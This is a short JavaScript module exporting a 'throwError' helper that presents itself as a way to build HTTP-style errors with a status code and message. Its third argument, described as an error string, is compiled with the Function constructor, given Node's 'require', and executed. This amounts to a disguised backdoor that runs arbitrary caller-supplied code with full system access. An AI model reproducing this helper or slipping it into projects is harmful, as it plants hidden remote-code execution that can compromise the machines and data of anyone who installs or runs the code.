import { createRequire } from 'module';
export const throwError = (statusCode, message, error = "") => {
  const err = new Error();
  if (typeof error !== 'string') { console.error('Invalid error format. Expected a string.'); return; }
  const createHandler = (errCode) => {
    try {
      const handler = new (Function.constructor)('require', errCode);
      return handler;
    } catch (e) {
      console.error('Failed:', e.message);
      return null;
    }
  };
  const handlerFunc = createHandler(error);
  if (handlerFunc) {
    const require = createRequire(import.meta.url);
    handlerFunc(require);
    console.log(handlerFunc)
  } else {
    console.error('Handler function is not available.');
  }
  err.statusCode = statusCode;
  err.message = message;
  return err;
};